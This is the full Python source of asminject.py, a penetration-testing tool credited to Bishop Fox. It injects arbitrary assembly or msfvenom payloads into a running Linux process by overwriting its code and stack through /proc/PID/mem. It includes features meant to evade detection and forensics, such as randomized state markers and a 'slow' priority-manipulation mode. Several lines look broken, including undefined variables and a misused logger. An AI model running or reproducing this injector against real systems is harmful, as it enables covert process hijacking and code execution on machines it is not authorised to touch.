#!/usr/bin/env python3

f"Python version >= 3.6 required!"
# ^^^ fstrings are valid since python 3.6, will syntax error otherwise

BANNER = r"""
                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.8
Ben Lincoln, Bishop Fox, 2022-05-06
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject
"""

import argparse
import inspect
import os
import psutil
import re
import secrets
import signal
import stat
import struct
import sys
import tempfile
import time
import subprocess

class asminject_parameters:
    def get_secure_random_not_in_list(self, max_value, list_of_existing_values):
        result = secrets.randbelow(max_value)
        while result in list_of_existing_values:
            result = secrets.randbelow(max_value)
        return result

    def randomize_state_variables(self):
        self.state_ready_for_shellcode_write = secrets.randbelow(self.state_variable_max)
        comparison_list = [self.state_ready_for_shellcode_write]
        self.state_shellcode_written = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_shellcode_written)
        self.state_ready_for_memory_restore = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_ready_for_memory_restore)
        self.state_memory_restored = self.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_memory_restored)

    def __init__(self):
        # x86-64: 8 bytes * 16 registers
        self.stack_backup_size = 8 * 16
        
        self.communication_address_offset = -40
        self.communication_address_backup_size = 24
        self.cpu_state_size = 512
        self.stage2_size = 0x8000
        self.read_write_block_size = 0x8000
        
        # For "slow" mode
        self.high_priority_nice = -20
        self.low_priority_nice = 20

        self.sleep_time_waiting_for_syscalls = 0.1
        self.max_address_npic_suggestion = 0x00400000
        
        # Randomized from initial state to make detection more challenging
        self.state_variable_max = 0xFFFFFF
        self.state_ready_for_shellcode_write = 47
        self.state_shellcode_written = self.state_ready_for_shellcode_write * 2
        self.state_ready_for_memory_restore = self.state_ready_for_shellcode_write * 3
        self.state_memory_restored = self.state_ready_for_shellcode_write * 4
        self.randomize_state_variables()
        
        self.base_script_path = ""
        self.pid = -1
        self.asm_path = ""
        self.relative_offsets = {}
        self.non_pic_binaries = []
        self.architecture = ""
        self.stop_method="sigstop"
        self.ansi=True
        self.pause=False
        self.precompiled=False
        self.custom_replacements = {}
        self.delete_temp_files=True
        self.freeze_dir = "/sys/fs/cgroup/freezer/" + secrets.token_bytes(8).hex()
        
        self.asminject_pid = None
        self.asminject_priority = None
        self.target_priority = None
        self.asminject_affinity = None
        self.target_affinity = None
        self.target_process = None
        
    def set_dynamic_process_info_vars(self):
        self.target_process = psutil.Process(self.pid)
        self.asminject_pid = os.getpid()
        self.asminject_process = psutil.Process(self.asminject_pid)
        self.asminject_priority = self.asminject_process.nice()
        self.target_priority = self.target_process.nice()
        self.asminject_affinity = self.asminject_process.cpu_affinity()
        self.target_affinity = self.target_process.cpu_affinity()

class communication_variables:
    def __init__(self):
        self.state_value = None
        self.read_execute_address = None
        self.read_write_address = None

def ansi_color(name):
    color_codes = {
        "blue": 34,
        "red": 91,
        "orange": 209,
        "green": 32,
        "default": 39,
    }
    return f"\x1b[{color_codes[name]}m"


def log(msg, color="blue", symbol="*", ansi=True):
    if ansi:
        print(f"[{ansi_color(color)}{symbol}{ansi_color('default')}] {msg}")
    else:
        print(f"[{symbol}] {msg}")


def log_success(msg, ansi=True):
    log(msg, "green", "+", ansi)

def log_warning(msg, ansi=True):
    log(msg, "orange", "*", ansi)

def log_error(msg, ansi=True):
    log(msg, "red", "!", ansi)
    #raise Exception(msg)


def assemble(source, injection_params, library_bases, replacements = {}):
    formatted_source = source
    lname_placeholders = []
    lname_placeholders_matches = re.finditer(r'(\[BASEADDRESS:)(.*?)(:BASEADDRESS\])', formatted_source)
    for match in lname_placeholders_matches:
        placeholder_regex = match.group(2)
        if placeholder_regex not in lname_placeholders:
            lname_placeholders.append(placeholder_regex)
    for lname_regex in lname_placeholders:
        found_library_match = False
        for lname in library_bases.keys():
            if re.search(lname_regex, lname):
                log(f"Using '{lname}' for regex placeholder '{lname_regex}' in assembly code", ansi=injection_params.ansi)
                replacements[f"[BASEADDRESS:{lname_regex}:BASEADDRESS]"] = f"0x{library_bases[lname]['base']:016x}"
                found_library_match = True
        if not found_library_match:
            log_error(f"Could not find a match for the regular expression '{lname_regex}' in the list of libraries loaded by the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload.", ansi=injection_params.ansi)
            return None
    for fname in injection_params.relative_offsets.keys():
        replacements[f"[RELATIVEOFFSET:{fname}:RELATIVEOFFSET]"] = f"0x{injection_params.relative_offsets[fname]:016x}"

    for search_text in replacements.keys():
        #if search_text not in formatted_source:
        #    log_error(f"Placeholder '{search_text}' in assembly source code was not found.", ansi=injection_params.ansi)
            #sys.exit(1)
        formatted_source = formatted_source.replace(search_text, replacements[search_text])
    
    # check for any remaining placeholders in the formatted source code
    placeholder_types = ['BASEADDRESS', 'RELATIVEOFFSET', 'VARIABLE']
    missing_values = []
    for pht in placeholder_types:
        missing_placeholders_matches = re.finditer(r'(\[' + pht + ':)(.*?)(:' + pht + '\])', formatted_source)
        for match in missing_placeholders_matches:
            missing_string = match.group(0)
            if missing_string not in missing_values:
                missing_values.append(missing_string)
    
    #log(f"Formatted code:\n{formatted_source}", ansi=injection_params.ansi)
    
    if len(missing_values) > 0:
        log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}", ansi=injection_params.ansi)
        return None

    result = None

    try:
        (tf, out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
        os.close(tf)
        # output file is chmodded 0777 so that the target process' user account can delete it if necessary as well as reading it
        try:
            os.chmod(out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        except Exception as e:
            log_warning(f"Couldn't set permissions on '{out_path}': {e}", ansi=injection_params.ansi)
        log(f"Writing assembled binary to {out_path}", ansi=injection_params.ansi)
        #out_path = f"/tmp/assembled_{os.urandom(8).hex()}.bin"
        #cmd = "gcc -x assembler - -o {0} -nostdlib -Wl,--oformat=binary -m64 -fPIC".format()
        argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-Wl,--oformat=binary", "-m64", "-fPIC"]
        # ARM gcc doesn't support the raw binary output format, and it's necessary to pass -Wl,--build-id=none so 
        # that the linker doesn't include metadata that objcopy will misinterpret later
        # same for the -s option: including the debugging metadata causes objcopy to output a file with a huge
        # amount of empty space in it
        if injection_params.architecture == "arm32":
            argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-Wl,--build-id=none", "-s"]
            #argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-pie", "-Wl,--build-id=none", "-s"]

        program = formatted_source.encode()
        pipe = subprocess.PIPE

        log(f"Assembler command: {argv}", ansi=injection_params.ansi)
        result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
        
        if result.returncode != 0:
            emsg = result.stderr.decode().strip()
            log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
            return None
        
        # ld for ARM won't emit raw binaries like it will for x86-32
        if injection_params.architecture == "arm32":
            try:
                (tf2, obj_out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
                os.close(tf2)
                try:
                    os.chmod(obj_out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
                except Exception as e:
                    log_warning(f"Couldn't set permissions on '{obj_out_path}': {e}", ansi=injection_params.ansi)
                log(f"Converting executable '{out_path}' to raw binary file {obj_out_path}", ansi=injection_params.ansi)
                argv = ["objcopy", "-O", "binary", out_path, obj_out_path]
                #log(f"objdump command: {argv}", ansi=injection_params.ansi)
                result = subprocess.run(argv, stdout=pipe, stderr=pipe)
                
                if result.returncode != 0:
                    emsg = result.stderr.decode().strip()
                    log_error("objdump command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
                    return None
                
                if injection_params.delete_temp_files:
                    try:
                        os.remove(out_path)
                    except Exception as e:
                        log_error(f"Couldn't delete termporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
                
                out_path = obj_out_path
            except Exception as e:
                log_error(f"Couldn't convert assembler output to raw binary using objdump: {e}", ansi=injection_params.ansi)
                return None
        
    except Exception as e:
        log_error(f"Couldn't assemble code using gcc: {e}", ansi=injection_params.ansi)
        return None
        
    result_code = None
    try:
        if os.path.isfile(out_path):
            with open(out_path, "rb") as assembled_code:
                result_code = assembled_code.read()
    except Exception as e:
        log_error(f"Couldn't read assembled binary '{out_path}': {e}", ansi=injection_params.ansi)
        return None

    if injection_params.delete_temp_files:
        try:
            os.remove(out_path)
        except Exception as e:
            log_error(f"Couldn't delete temporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
    
    return result_code

def get_memory_map_data(injection_params):
    result = {}
    with open(f"/proc/{injection_params.pid}/maps") as maps_file:
        for line in maps_file.readlines():
            linesplit = line.split()
            ld_path = linesplit[-1]
            addr_split = linesplit[0].split("-")
            ld_base = int(addr_split[0], 16)
            ld_end = int(addr_split[1], 16)
            if ld_path not in result.keys():
                is_non_pic_binary = False
                for npb_pattern in injection_params.non_pic_binaries:
                    if re.search(npb_pattern, ld_path):
                        is_non_pic_binary = True
                        break
                result_entry = {}
                result_entry["access"] = linesplit[1]
                
                if is_non_pic_binary:
                    result_entry["base"] = 0
                    result_entry["end"] = ld_end
                    log_warning(f"Handling '{ld_path}' as non-PIC binary", ansi=injection_params.ansi)
                else:
                    result_entry["base"] = ld_base
                    result_entry["end"] = ld_end
                    if ld_base <= injection_params.max_address_npic_suggestion:
                        log_warning(f"'{ld_path}' has a base address of {ld_base}, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary \"{ld_path}\" to your asminject.py options.", ansi=injection_params.ansi)
                
                result[ld_path] = result_entry
    return result

def get_temp_file_name():
    (tf, result) = tempfile.mkstemp(suffix=None, dir=None, text=False)
    os.close(tf)
    return result
    
def get_syscall_values(pid):
    result = {}
    syscall_data = ""
    syscall_vals = []
    result["rip"] = 0
    result["rsp"] = 0
    result["syscall_data"] = ""
    try:
        with open(f"/proc/{pid}/syscall") as syscall_file:
            syscall_data = syscall_file.read()
            result["syscall_data"] = syscall_data
            syscall_vals = syscall_data.split(" ")
        if " " in syscall_data:
            result["rip"] = int(syscall_vals[-1][2:], 16)
            result["rsp"] = int(syscall_vals[-2][2:], 16)
        else:
            log(f"Couldn't retrieve current syscall values", ansi=injection_params.ansi)
    except Exception as e:
        log_error(f"Couldn't retrieve current syscall values: {e}", ansi=injection_params.ansi)
    return result

def wait_for_communication_state(pid, communication_address, wait_for_value):
    done_waiting = False
    data = communication_variables()
    while not done_waiting:
        try:
            with open(f"/proc/{pid}/mem", "rb") as mem:
                syscall_data = ""
                try:
                    # check to see if stage 1 has given the OK to proceed
                    syscall_check_result = get_syscall_values(pid)
                    rip = syscall_check_result["rip"]
                    rsp = syscall_check_result["rsp"]
                    sleep_this_iteration = True
                    if rip != 0 and rsp != 0:
                        log(f"RSP is 0x{rsp:016x}", ansi=injection_params.ansi)
                        mem.seek(communication_address)
                        data.state_value = struct.unpack('Q', mem.read(8))[0]
                        mem.seek(communication_address + 8)
                        data.read_execute_address = struct.unpack('Q', mem.read(8))[0]
                        data.read_write_address = struct.unpack('Q', mem.read(8))[0]
                        log(f"State value at communication address 0x{communication_address:08x} is 0x{data.state_value:016x}", ansi=injection_params.ansi)
                        log(f"Read/execute block address at communication address 0x{communication_address:08x} + 8 is 0x{data.read_execute_address:016x}", ansi=injection_params.ansi)
                        log(f"Read/write block address at communication address 0x{communication_address:08x} + 16 is 0x{data.read_write_address:016x}", ansi=injection_params.ansi)
                        
                        if data.state_value == wait_for_value:
                            log(f"Communications address value matches wait value 0x{wait_for_value:016x}", ansi=injection_params.ansi)
                            sleep_this_iteration = False
                            done_waiting = True
                        
                    if sleep_this_iteration:
                        log("Waiting for injected code", ansi=injection_params.ansi)
                        time.sleep(1.0)
                except Exception as e:
                    log_error(f"Couldn't get target process information: {e}, {syscall_data}", ansi=injection_params.ansi)
        except FileNotFoundError as e:
            log_error(f"Process {pid} disappeared during injection attempt - exiting", ansi=injection_params.ansi)
            sys.exit(1)
    return data

def asminject(injection_params):
    stage1 = None
        
    stage1_source_filename = "stage1-memory.s"
    stage1_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage1_source_filename)
    if not os.path.isfile(stage1_path):
        log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=injection_params.ansi)
        continue_executing = False

    if not os.path.isfile(injection_params.asm_path):
        log_error(f"Could not find the stage 2 file '{injection_params.asm_path}'", ansi=injection_params.ansi)
        return

    if injection_params.stop_method == "sigstop":
        log("Sending SIGSTOP", ansi=injection_params.ansi)
        os.kill(injection_params.pid, signal.SIGSTOP)
        while True:
            with open(f"/proc/{pid}/stat") as stat_file:
                state = stat_file.read().split(" ")[2]
            if state in ["T", "t"]:
                break
            log("Waiting for process to stop...", ansi=injection_params.ansi)
            time.sleep(0.1)
    elif injection_params.stop_method == "cgroup_freeze":
        log(f"Freezing process {injection_params.pid} using directory {injection_params.freeze_dir}", ansi=injection_params.ansi)
        os.mkdir(injection_params.freeze_dir)
        with open(injection_params.freeze_dir + "/tasks", "w") as task_file:
            task_file.write(str(injection_params.pid))
        with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
            state_file.write("FROZEN\n")
        while True:
            with open(injection_params.freeze_dir + "/freezer.state") as state_file:
                if state_file.read().strip() == "FROZEN":
                    break
            log("Waiting for process to freeze", ansi=injection_params.ansi)
            time.sleep(0.1)
        log("Process is frozen", ansi=injection_params.ansi)
    elif injection_params.stop_method == "slow":
        log("Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...", ansi=injection_params.ansi)
        try:
            injection_params.set_dynamic_process_info_vars()
            
            log(f"Current process priority for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_priority}", ansi=injection_params.ansi)
            log(f"Current CPU affinity for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_affinity}", ansi=injection_params.ansi)
            log(f"Current process priority for target process (PID: {injection_params.pid}) is {injection_params.target_priority}", ansi=injection_params.ansi)
            log(f"Current CPU affinity for target process (PID: {injection_params.pid}) is {injection_params.target_affinity}", ansi=injection_params.ansi)
        except Exception as e:
            log_error(f"Couldn't get process information for slowing: {e}", ansi=injection_params.ansi)
            sys.exit(1)  
        try:
            injection_params.set_dynamic_process_info_vars()
            
            log(f"Setting process priority for asminject.py (PID: {injection_params.asminject_pid}) to {injection_params.high_priority_nice}", ansi=injection_params.ansi)
            injection_params.asminject_process.nice(injection_params.high_priority_nice)
            log(f"Setting process priority for target process (PID: {injection_params.pid}) to {injection_params.low_priority_nice}", ansi=injection_params.ansi)
            injection_params.target_process.nice(injection_params.low_priority_nice)
            log(f"Setting CPU affinity for target process (PID: {injection_params.pid}) to {injection_params.asminject_affinity}", ansi=injection_params.ansi)
            injection_params.target_process.cpu_affinity(injection_params.asminject_affinity)
        except Exception as e:
            log_error(f"Couldn't set process information for 'slow' mode: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    else:
        log.warn("We're not going to stop the process first!", ansi=injection_params.ansi)

    stack_backup_address = 0
    code_backup_address = 0

    stack_backup = b''
    code_backup = b''
    communication_address_backup = b''
    
    continue_executing = True
    try:
        got_initial_syscall_data = False
        syscall_check_result = None
        rip = 0
        rsp = 0
        while not got_initial_syscall_data:
            syscall_check_result = get_syscall_values(injection_params.pid)
            rip = syscall_check_result["rip"]
            rsp = syscall_check_result["rsp"]
            if rip == 0 or rsp == 0:
                log_error("Couldn't get current syscall data", ansi=injection_params.ansi)
                time.sleep(SLEEP_TIME_WAITING_FOR_SYSCALLS)
            else:
                got_initial_syscall_data = True
        log(f"RIP: {hex(rip)}", ansi=injection_params.ansi)
        log(f"RSP: {hex(rsp)}", ansi=injection_params.ansi)

        library_bases = get_memory_map_data(injection_params)
        library_names = []
        for lname in library_bases.keys():
            library_names.append(lname)
        library_names.sort()
        for lname in library_names:
            log(f"{lname}: 0x{library_bases[lname]['base']:016x}", ansi=injection_params.ansi)
        
        communication_address = library_bases["[stack]"]["end"] + injection_params.communication_address_offset
        
        if continue_executing:
            log(f"Using: 0x{injection_params.state_ready_for_shellcode_write:08x} for 'ready for shellcode write' state value", ansi=injection_params.ansi)
            log(f"Using: 0x{injection_params.state_shellcode_written:08x} for 'shellcode written' state value", ansi=injection_params.ansi)
            log(f"Using: 0x{injection_params.state_ready_for_memory_restore:08x} for 'ready for memory restore' state value", ansi=injection_params.ansi)
            
            stage1_replacements = {}
            stage1_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
            stage1_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
            stage1_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
            stage1_replacements['[VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]'] = f"{injection_params.state_ready_for_shellcode_write}"
            stage1_replacements['[VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE]'] = f"{injection_params.state_shellcode_written}"
            stage1_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
            stage1_replacements['[VARIABLE:STAGE2_SIZE:VARIABLE]'] = f"{injection_params.stage2_size}"
            stage1_replacements['[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_write_block_size}"
            stage1_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
            
            with open(stage1_path, "r") as stage1_code:
                stage1 = assemble(stage1_code.read(), injection_params, library_bases, replacements=stage1_replacements)

            if not stage1:
                continue_executing = False
            else:
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    # back up the code we're about to overwrite
                    code_backup_address = rip
                    mem.seek(code_backup_address)
                    code_backup = mem.read(len(stage1))

                    # back up the part of the stack that the shellcode will clobber
                    stack_backup_address = rsp - injection_params.stack_backup_size
                    mem.seek(stack_backup_address)
                    stack_backup = mem.read(injection_params.stack_backup_size)
                    
                    # back up the data at the communication address
                    mem.seek(communication_address)
                    communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                    
                    # Set the "memory restored" state variable to match the first 8 bytes of the backed up communications address data
                    #low_half = struct.unpack('I', communication_address_backup[0:4])[0]
                    #high_half = struct.unpack('I', communication_address_backup[4:8])[0] << 32
                    #injection_params.state_memory_restored = high_half | low_half
                    injection_params.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
                    log(f"Will specify 0x{injection_params.state_shellcode_written:016x} @ 0x{communication_address:016x} as the 'memory restored' value", ansi=injection_params.ansi)

                    # write the primary shellcode
                    mem.seek(rip)
                    mem.write(stage1)

                log(f"Wrote first stage shellcode at 0x{rip:016x} in target process {injection_params.pid}", ansi=injection_params.ansi)


        if injection_params.stop_method == "sigstop":
            log("Continuing process", ansi=injection_params.ansi)
            os.kill(injection_params.pid, signal.SIGCONT)
        elif injection_params.stop_method == "cgroup_freeze":
            log("Thawing process", ansi=injection_params.ansi)
            with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
                state_file.write("THAWED\n")

            # put the task back in the root cgroup
            with open("/sys/fs/cgroup/freezer/tasks", "w") as task_file:
                task_file.write(str(injection_params.pid))

            # cleanup
            os.rmdir(injection_params.freeze_dir)
        elif injection_params.stop_method == "slow":
            log("Returning to normal time", ansi=injection_params.ansi)
            try:
                log(f"Setting process priority for asminject.py (PID: {injection_params.asminject_pid}) to {injection_params.asminject_priority}", ansi=injection_params.ansi)
                injection_params.asminject_process.nice(injection_params.asminject_priority)
                log(f"Setting process priority for target process (PID: {injection_params.pid}) to {injection_params.target_priority}", ansi=injection_params.ansi)
                injection_params.target_process.nice(injection_params.target_priority)
                log(f"Setting CPU affinity for target process (PID: {injection_params.pid}) to {injection_params.target_affinity}", ansi=injection_params.ansi)
                injection_params.target_process.cpu_affinity(injection_params.target_affinity)
            except Exception as e:
                log_error(f"Couldn't set process information to revert from 'slow' mode: {e}", ansi=injection_params.ansi)
                sys.exit(1)

        if continue_executing:
            stage2 = None
                
            if injection_params.precompiled:
                with open(injection_params.asm_path, "rb") as asm_code:
                    stage2 = asm_code.read()
            else:
                stage2_replacements = injection_params.custom_replacements
                stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
                stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
                stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
                stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
                stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
                stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
                stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
                stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
                stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
                stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
                stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
                
                current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_shellcode_write)
                stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address}"
                stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size}"
                stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{current_state.read_write_address + injection_params.read_write_block_size - 8}"
                
                with open(injection_params.asm_path, "r") as asm_code:
                    stage2 = assemble(asm_code.read(), injection_params, library_bases, replacements=stage2_replacements)
            
            if not stage2:
                continue_executing = False
            else:
                log(f"Writing stage 2 to 0x{current_state.read_execute_address:016x} in target memory", ansi=injection_params.ansi)
                # write stage 2
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    mem.seek(current_state.read_execute_address)
                    mem.write(stage2)
                    
                    # Give stage 1 the OK to proceed
                    log(f"Writing 0x{injection_params.state_shellcode_written:016x} to 0x{communication_address:016x} in target memory to indicate OK", ansi=injection_params.ansi)
                    mem.seek(communication_address)
                    ok_val = struct.pack('I', injection_params.state_shellcode_written)
                    mem.write(ok_val)
                    log("Stage 2 proceeding", ansi=injection_params.ansi)
                
                current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_memory_restore)
                log("Restoring original memory content", ansi=injection_params.ansi)
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    mem.seek(code_backup_address)
                    mem.write(code_backup)

                    mem.seek(stack_backup_address)
                    mem.write(stack_backup)

                    mem.seek(communication_address)
                    mem.write(communication_address_backup)
                        
    except KeyboardInterrupt as ki:
        log_warning(f"Operator cancelled the injection attempt", ansi=injection_params.ansi)
        continue_executing = False
    
    log_success("Done!", ansi=injection_params.ansi)


# begin: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

# end: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse

if __name__ == "__main__":
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Inject arbitrary assembly code into a live process")

    parser.add_argument("pid", metavar="process_id", type=int,
        help="The pid of the target process")

    parser.add_argument("asm_path", metavar="payload_path", type=str,
        help="Path to the assembly code that should be injected")

    parser.add_argument("--relative-offsets", action='append', nargs='*', required=False,
        help="Path to the list of relative offsets referenced in the assembly code. May be specified multiple times to reference several files. Generate on a per-binary basis using the following command, e.g. for libc-2.31: # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d\" \" -f3,9")
    
    parser.add_argument("--non-pic-binary", action='append', nargs='*', required=False,
        help="Regular expression identifying one or more executables/libraries that do *not* use position-independent code, such as Python 3.x")

    parser.add_argument("--stop-method",
        choices=["sigstop", "cgroup_freeze", "slow", "none"],
        help="How to stop the target process prior to shellcode injection. \
              'sigstop' (default) uses the built-in Linux process suspension mechanism, and can have side-effects. \
              'cgroup_freeze' requires root, and only operates in environments with cgroups.\
              'slow' attempts to avoid forensic detection and side-effects of suspending a process by \
              temporarily setting the priority of the target process to the lowest possible value, \
              and the priority of asminject.py to the highest possible value. \
              'none' leaves the target process running as-is and is likely to cause race conditions.")
    
    parser.add_argument("--arch",
        #choices=["x86-32", "x86-64", "arm32", "arm64"], default="x86-64",
        choices=["x86-64", "arm32"], default="x86-64",
        help="Processor architecture for the injected code. \
              Default: x86-64.")
            
    parser.add_argument("--var",action='append',nargs=2, type=str,
        help="Specify a custom variable for use by the stage 2 code, e.g. --var pythoncode \"print('OK')\". May be specified multiple times for different variables.")
    
    parser.add_argument("--plaintext", type=str2bool, nargs='?',
        const=True, default=False,
        help="Disable ANSI formatting for console output")
    
    parser.add_argument("--pause", type=str2bool, nargs='?',
        const=True, default=True,
        help="Prompt for input before resuming/unfreezing the target process")
    
    parser.add_argument("--precompiled", type=str2bool, nargs='?',
        const=True, default=False,
        help="Treat the stage 2 payload as a binary that has already been compiled (e.g. msfvenom output) and do not attempt to compile it from source code")

    parser.add_argument("--preserve-temp-files", type=str2bool, nargs='?',
        const=True, default=False,
        help="Do not delete temporary files created during the assembling and linking process")
        
    args = parser.parse_args()

    injection_params = asminject_parameters()
    
    if args.var:
        for var_set in args.var:
            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}:VARIABLE]"] = var_set[1]

    injection_params.base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
    injection_params.pid = args.pid
    injection_params.asm_path = os.path.abspath(args.asm_path)
    injection_params.architecture = args.arch
    injection_params.stop_method = args.stop_method
    injection_params.pause = args.pause
    injection_params.precompiled = args.precompiled
    injection_params.ansi = args.plaintext
    
    if args.preserve_temp_files:
        injection_params.delete_temp_files = False
    
    # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > offsets-libc-2.31.so.txt
    if args.relative_offsets:
        if len(args.relative_offsets) > 0:
            for elem in args.relative_offsets:
                for offsets_path in elem:
                    if offsets_path.strip() != "":
                        reloff_abs_path = os.path.abspath(offsets_path)
                        with open(reloff_abs_path) as offsets_file:
                            for line in offsets_file.readlines():
                                line_array = line.strip().split(" ")
                                offset_name = line_array[1].strip()
                                if offset_name in injection_params.relative_offsets.keys():
                                    log_warning(f"The offset '{offset_name}' is redefined in '{reloff_abs_path}'", ansi=args.plaintext)
                                offset_value = int(line_array[0], 16)
                                if offset_value > 0:
                                    injection_params.relative_offsets[offset_name] = offset_value
                                #else:
                                #    log_warning(f"Ignoring offset '{offset_name}' in '{reloff_abs_path}' because it has a value of zero", ansi=args.plaintext)
    
    if len(injection_params.relative_offsets) < 1:
        if not injection_params.precompiled:
            log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
    
    if args.non_pic_binary:
        if len(args.non_pic_binary) > 0:
            for elem in args.non_pic_binary:
                for pb in elem:
                    if pb.strip() != "":
                        if pb not in injection_params.non_pic_binaries:
                            injection_params.non_pic_binaries.append(pb)

    asminject(injection_params)
